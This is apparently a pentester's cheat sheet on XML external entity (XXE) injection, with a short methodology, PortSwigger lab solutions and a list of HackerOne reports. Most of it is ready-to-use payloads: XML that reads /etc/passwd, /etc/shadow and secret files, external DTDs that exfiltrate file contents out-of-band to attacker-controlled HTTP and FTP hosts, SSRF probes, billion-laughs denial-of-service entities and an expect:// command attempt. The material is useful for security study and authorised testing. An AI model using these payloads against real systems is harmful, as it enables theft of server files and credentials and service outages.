---
description: 'CWE-611: Improper Restriction of XML External Entity Reference'
---

# XXE

**There are various types of XXE attacks:**

| XXE Attack Type                                          | Description                                                                                                        |
| -------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| Exploiting XXE to Retrieve Files                         | Where an external entity is defined containing the contents of a file, and returned in the application's response. |
| Exploiting XXE to Perform SSRF Attacks                   | Where an external entity is defined based on a URL to a back-end system.                                           |
| Exploiting Blind XXE Exfiltrate Data Out-of-Band         | Where sensitive data is transmitted from the application server to a system that the attacker controls.            |
| Exploiting blind XXE to Retrieve Data Via Error Messages | Where the attacker can trigger a parsing error message containing sensitive data.                                  |

> **Methodology** [whitechaitai](https://twitter.com/whitechaitai)

1. Convert the content type from "application/json"/"application/x-www-form-urlencoded" to "applcation/xml".
2. File Uploads allows for docx/xlcs/pdf/zip , unzip the package and add your evil xml code into the xml files.
3. If svg allowed in picture upload , you can inject xml in svgs.
4. If the web app offers RSS feeds , add your milicious code into the RSS.
5. Fuzz for /soap api , some applications still running soap apis
6. If the target web app allows for SSO integration, you can inject your milicious xml code in the SAML request/reponse

### Test Payload[#](https://trojand.com/cheatsheet/Web/XXE\_Injection.html#test-payload)

#### Using private External Entity[#](https://trojand.com/cheatsheet/Web/XXE\_Injection.html#using-private-external-entity)

```xml
<?xml version="1.0" ?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY cat "Tom">
]>
<Contact>
<lastName>&cat;</lastName>
<firstName>Jerry</firstName>
</Contact>
```

#### Using a public External Entity[#](https://trojand.com/cheatsheet/Web/XXE\_Injection.html#using-a-public-external-entity)

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
	<!ELEMENT data ANY >
	<!ENTITY cat SYSTEM "file:///etc/passwd">
]>
<Contact>
<lastName>&cat;</lastName>
<firstName>Jerry</firstName>
</Contact>
```

### CDATA[#](https://trojand.com/cheatsheet/Web/XXE\_Injection.html#cdata)

*   [ ] XXE that can print XML files through the CDATA:

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE data [
    <!ELEMENT data ANY >
    <!ENTITY % start "<![CDATA[">
    <!ENTITY % file SYSTEM "file:///var/www/html/myapp/WEB-INF/web.xml" >
    <!ENTITY % end "]]>">
    <!ENTITY % dtd SYSTEM "http://192.168.1.5:8000/wrapper.dtd" >
    %dtd;
    ]>
    <Contact>
    <lastName>&wrapper;</lastName>
    <firstName>FIRSTNAME_FILLER</firstName>
    </Contact>
    ```
*   [ ] Inside the `wrapper.dtd` (the external DTD file)

    * Its purpose is just to wrap the variables(parameters) into

    ```xml
    <!ENTITY wrapper "%start;%file;%end;">
    ```
*   [ ] **Exploitation**

    **LFI Test**

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE foo [
    <!ELEMENT foo (#ANY)>
    <!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
    ```

    **Blind LFI test (when first case doesn't return anything)**

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE foo [
    <!ELEMENT foo (#ANY)>
    <!ENTITY % xxe SYSTEM "file:///etc/passwd">
    <!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>
    ```

    **Access Control bypass (loading restricted resources - PHP example)**

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE foo [
    <!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
    <foo><result>&ac;</result></foo>
    ```

    **SSRF Test**

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE foo [
    <!ELEMENT foo (#ANY)>
    <!ENTITY xxe SYSTEM "<https://www.example.com/text.txt>">]><foo>&xxe;</foo>
    ```

    **XEE (XML Entity Expansion - DOS)**

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ELEMENT lolz (#PCDATA)>
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    ]>
    <lolz>&lol9;</lolz>
    ```

    **XEE #2 (Remote attack - through external xml inclusion)**

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE lolz [
    <!ENTITY test SYSTEM "<https://example.com/entity1.xml>">]>
    <lolz><lol>3..2..1...&test<lol></lolz>

    ```

    **XXE FTP HTTP Server**

    https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb

    http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html

    ```xml
    <!DOCTYPE data [
    <!ENTITY % remote SYSTEM "<http://publicServer.com/parameterEntity_sendftp.dtd>">
    %remote;
    %send;
    ]>
    <data>4</data>

    File stored on <http://publicServer.com/parameterEntity_sendftp.dtd>

    <!ENTITY % param1 "<!ENTITY &#37; send SYSTEM 'ftp://publicServer.com/%payload;'>">
    %param1;
    ```

    **XXE UTF-7**

    ```xml
    <?xml version="1.0" encoding="UTF-7"?>
    +ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
    +ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
    +ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
    ```

    To convert between UTF-8 & UTF-7 use recode. `recode UTF8..UTF7 payload-file.xml`
*   [ ] [**Blind XXE with out-of-band interaction**](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)

    **Exploit**

    ```jsx
    <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://604s4g1hgg9g6irk4v41hsjt2k8bw4kt.oastify.com"> ]>
    <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
    ```
*   [ ] [**Exploiting blind XXE to exfiltrate data using a malicious external DTD**](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)

    **External DTD**

    ```jsx
    <!ENTITY % file SYSTEM "file:///etc/hostname">
    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
    %eval;
    %exfil;
    ```

    **Exploit**

    ```jsx
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
    ```
*   [ ] [**Blind XXE with out-of-band interaction via XML parameter entities**](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)

    **Exploit**

    ```xml
    <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
    ```
*   [ ] [**Exploiting blind XXE to retrieve data via error messages**](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages) **\[ DTD Blind Out-of-band ]**

    > On the exploit server change the hosted file name to /exploit.dtd as the exploit file with Document Type Definition (DTD) extension, containing the following payload. The % is the Unicode hex character code for percent sign %. Parameter entities are referenced using the percent character instead of the usual ampersand.

    ```xml
    <!ENTITY % file SYSTEM "file:///home/carlos/secret">
    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLABORATOR.net/?x=%file;'>">
    %eval;
    %exfil;
    ```

    > Modify the file upload XML body of the request before sending to the target server.

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE users [<!ENTITY % xxe SYSTEM "https://EXPLOIT.net/exploit.dtd"> %xxe;]>
    <users>
        <user>
            <username>Carl Toyota</username>
            <email>carlos@hacked.net</email>
        </user>    
    </users>
    ```
*   [ ] [**Exploiting XInclude to retrieve files**](https://portswigger.net/web-security/xxe/lab-xinclude-attack)

    > File upload or user import function on web target use XML file format. This can be vulnerable to XML external entity (XXE) injection.

    #### Identify XML

    > Possible to find XXE attack surface in requests that do not contain any XML.

    > To Identify XXE in not so obvious parameters or requests, require adding the below and URL encode the & ampersand symbol to see the response.

    `%26entity;`

    > Below the server respond with **indication that XML Entities are not allowed for security reasons.**

    ![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/56f1b87b-65b9-44d3-bf32-80c5dcffd914/Untitled.png)

    ```xml
    <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
    URL encode the XXE payload before sending.

    <foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>
    ```
*   [ ] [PortSwigger Lab: Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)

    #### XXE via SVG Image upload

    > Identify image upload on the blog post function that accept svg images, and observe that the avatars already on blog source code is svg extensions.

    > The content of the image.svg file uploaded:

    ```xml
    <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///home/carlos/secret" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
    ```

    !https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/xxe-svg-upload.png
*   [ ] [**Exploiting XXE to retrieve data by repurposing a local DTD**](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd)

    > Systems using the GNOME desktop environment often have a DTD at `/usr/share/yelp/dtd/docbookx.dtd` containing an entity called `ISOamso.`

    ```xml
    <!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    '>
    %local_dtd;
    ]>
    ```

    #### XML External Entity (XXE) Injection Payloads

    #### XXE: Basic XML Example

    ```
    <!--?xml version="1.0" ?-->
    <userInfo>
     <firstName>John</firstName>
     <lastName>Doe</lastName>
    </userInfo>

    ```

    #### XXE: Entity Example

    ```
    <!--?xml version="1.0" ?-->
    <!DOCTYPE replace [<!ENTITY example "Doe"> ]>
     <userInfo>
      <firstName>John</firstName>
      <lastName>&example;</lastName>
     </userInfo>

    ```

    #### XXE: File Disclosure

    ```
    <!--?xml version="1.0" ?-->
    <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
    <userInfo>
     <firstName>John</firstName>
     <lastName>&ent;</lastName>
    </userInfo>

    ```

    #### XXE: Denial-of-Service Example

    ```
    <!--?xml version="1.0" ?-->
    <!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
    <tag>&lol9;</tag>

    ```

    #### XXE: Local File Inclusion Example

    ```
    <?xml version="1.0"?>
    <!DOCTYPE foo [
    <!ELEMENT foo (#ANY)>
    <!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>

    ```

    #### XXE: Blind Local File Inclusion Example (When first case doesn't return anything.)

    ```
    <?xml version="1.0"?>
    <!DOCTYPE foo [
    <!ELEMENT foo (#ANY)>
    <!ENTITY % xxe SYSTEM "file:///etc/passwd">
    <!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>

    ```

    #### XXE: Access Control Bypass (Loading Restricted Resources - PHP example)

    ```
    <?xml version="1.0"?>
    <!DOCTYPE foo [
    <!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
    <foo><result>&ac;</result></foo>

    ```

    #### XXE:SSRF ( Server Side Request Forgery ) Example

    ```
    <?xml version="1.0"?>
    <!DOCTYPE foo [
    <!ELEMENT foo (#ANY)>
    <!ENTITY xxe SYSTEM "<https://www.example.com/text.txt>">]><foo>&xxe;</foo>

    ```

    #### XXE: (Remote Attack - Through External Xml Inclusion) Exmaple

    ```
    <?xml version="1.0"?>
    <!DOCTYPE lolz [
    <!ENTITY test SYSTEM "<https://example.com/entity1.xml>">]>
    <lolz><lol>3..2..1...&test<lol></lolz>

    ```

    #### XXE: UTF-7 Exmaple

    ```
    <?xml version="1.0" encoding="UTF-7"?>
    +ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
    +ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
    +ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4

    ```

    #### XXE: Base64 Encoded

    ```
    <!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>

    ```

    #### XXE: XXE inside SOAP Example

    ```
    <soap:Body>
      <foo>
        <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "<http://x.x.x.x:22/>"> %dtd;]><xxx/>]]>
      </foo>
    </soap:Body>

    ```

    #### XXE: XXE inside SVG

    ```
    <svg xmlns="<http://www.w3.org/2000/svg>" xmlns:xlink="<http://www.w3.org/1999/xlink>" width="300" version="1.1" height="200">
        <image xlink:href="expect://ls"></image>
    </svg>

    ```

    #### References :

    👉 [XML External Entity (XXE) Processing](https://www.owasp.org/index.php/XML\_External\_Entity\_\(XXE\)\_Processing)

    👉 [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML\_External\_Entity\_Prevention\_Cheat\_Sheet.html)

    👉 [Testing for XML Injection (OTG-INPVAL-008)](https://www.owasp.org/index.php/Testing\_for\_XML\_Injection\_\(OTG-INPVAL-008\))

## Top XXE reports from HackerOne:

1. [XXE at ecjobs.starbucks.com.cn/retail/hxpublic\_v6/hxdynamicpage6.aspx](https://hackerone.com/reports/500515) to Starbucks - 308 upvotes, $4000
2. [XXE on pulse.mail.ru](https://hackerone.com/reports/505947) to Mail.ru - 263 upvotes, $6000
3. [XXE on sms-be-vip.twitter.com in SXMP Processor](https://hackerone.com/reports/248668) to Twitter - 250 upvotes, $10080
4. [XXE on https://duckduckgo.com](https://hackerone.com/reports/483774) to DuckDuckGo - 209 upvotes, $0
5. [Phone Call to XXE via Interactive Voice Response](https://hackerone.com/reports/395296) to ██████ - 170 upvotes, $0
6. [Partial bypass of #483774 with Blind XXE on https://duckduckgo.com](https://hackerone.com/reports/486732) to DuckDuckGo - 151 upvotes, $0
7. [Multiple endpoints are vulnerable to XML External Entity injection (XXE) ](https://hackerone.com/reports/72272)to Pornhub - 136 upvotes, $2500
8. [XXE through injection of a payload in the XMP metadata of a JPEG file](https://hackerone.com/reports/836877) to Informatica - 128 upvotes, $0
9. [XXE Injection through SVG image upload leads to SSRF](https://hackerone.com/reports/897244) to Zivver - 111 upvotes, $0
10. [XXE in Site Audit function exposing file and directory contents](https://hackerone.com/reports/312543) to Semrush - 99 upvotes, $2000
11. [\[RCE\] Unserialize to XXE - file disclosure on ams.upload.pornhub.com](https://hackerone.com/reports/142562) to Pornhub - 89 upvotes, $10000
12. [XXE in DoD website that may lead to RCE](https://hackerone.com/reports/227880) to U.S. Dept Of Defense - 89 upvotes, $0
13. [Blind XXE via Powerpoint files](https://hackerone.com/reports/334488) to Open-Xchange - 86 upvotes, $2000
14. [blind XXE in autodiscover parser](https://hackerone.com/reports/315837) to Mail.ru - 70 upvotes, $5000
15. [LFI and SSRF via XXE in emblem editor](https://hackerone.com/reports/347139) to Rockstar Games - 68 upvotes, $1500
16. [Blind OOB XXE At "http://ubermovement.com/"](https://hackerone.com/reports/154096) to Uber - 55 upvotes, $500
17. [XXE на webdav.mail.ru - PROPFIND/PROPPATCH](https://hackerone.com/reports/758978) to Mail.ru - 54 upvotes, $10000
18. [XXE on ██████████ by bypassing WAF ████](https://hackerone.com/reports/433996) to QIWI - 53 upvotes, $5000
19. [\[rev-app.informatica.com\] - XXE](https://hackerone.com/reports/105434) to Informatica - 44 upvotes, $0
20. [RCE via Local File Read -> php unserialization-> XXE -> unpickling](https://hackerone.com/reports/415501) to h1-5411-CTF - 43 upvotes, $0
21. [XML External Entity (XXE) in qiwi.com + waf bypass](https://hackerone.com/reports/99279) to QIWI - 39 upvotes, $3137
22. [Authenticated XXE](https://hackerone.com/reports/1095645) to WordPress - 39 upvotes, $600
23. [XML Parser Bug: XXE over which leads to RCE](https://hackerone.com/reports/55431) to drchrono - 32 upvotes, $700
24. [XXE on DoD web server](https://hackerone.com/reports/188743) to U.S. Dept Of Defense - 31 upvotes, $0
25. [Singapore - XXE at https://www.starbucks.com.sg/RestApi/soap11](https://hackerone.com/reports/762251) to Starbucks - 28 upvotes, $500
26. [\[app.informaticaondemand.com\] XXE](https://hackerone.com/reports/105753) to Informatica - 24 upvotes, $0
27. [Blind XXE on my.mail.ru](https://hackerone.com/reports/276276) to Mail.ru - 23 upvotes, $800
28. [Non-production Open Database In Combination With XXE Leads To SSRF](https://hackerone.com/reports/742808) to Evernote - 23 upvotes, $0
29. [XXE in upload file feature](https://hackerone.com/reports/105787) to Informatica - 21 upvotes, $0
